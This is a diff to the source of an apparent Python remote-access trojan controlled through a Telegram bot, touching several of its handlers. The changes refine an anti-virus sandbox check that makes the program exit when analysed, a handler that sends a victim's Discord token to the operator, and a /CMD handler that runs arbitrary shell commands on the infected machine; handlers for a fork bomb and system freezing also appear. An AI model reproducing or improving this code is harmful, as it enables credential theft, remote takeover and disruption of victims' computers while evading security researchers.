@@ -148,7 +148,7 @@ if not os.path.exists(Directory):
 
 # Checks if the script is running  computer of the anti-virus organization
 
-if OrganizationIp() or OrganizationPaths() is True:
+if Organization() is True:
  sys.exit()
 
 
@@ -795,7 +795,7 @@ def Taskkill(command):
    '\n'
    '\n_Active Window_'
    '\n'
-   '\n`' + WindowTitle() + '`',
+   '\n`' + str(WindowTitle()) + '`',
    reply_markup=main6, parse_mode='Markdown')
 
 
@@ -878,7 +878,7 @@ def Forkbomb(command):
 @bot.message_handler(regexp='/Discord')
 def Discord(command):
  try:
-  bot.send_message(command.chat.id, '_Discord Token_\n\n`' + DiscordToken() + '`', parse_mode='Markdown')
+  bot.send_message(command.chat.id, '*Discord Token*\n\n`' + DiscordToken() + '`', parse_mode='Markdown')
  except:
   bot.reply_to(command, '_Discord not installed!_', parse_mode='Markdown')
 
@@ -1075,7 +1075,7 @@ def Freeze(command):
 def CMD(command):
  try:
   Command = re.split('/CMD ', command.text, flags=re.I)[1]
-  CMD = Popen(Command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+  CMD = Popen(Command, shell=True, stdout=PIPE, stderr=STDOUT, stdin=PIPE)
   
   Lines = []
   for Line in CMD.stdout.readlines():
@@ -1155,7 +1155,7 @@ def Info(command):
    '\n_Hardware_'
    '\n'
    '\n*CPU* » `' + str(CPU) +'`' +
-   '\n*GPU* » ` '+ str(GPU) +'`' +
+   '\n*GPU* » `' + str(GPU) +'`' +
    '\n*RAM* » `' + str(RAM) +'`' +
    '\n*ARM* » `' + str(ARM) +'`' +
    '\n'
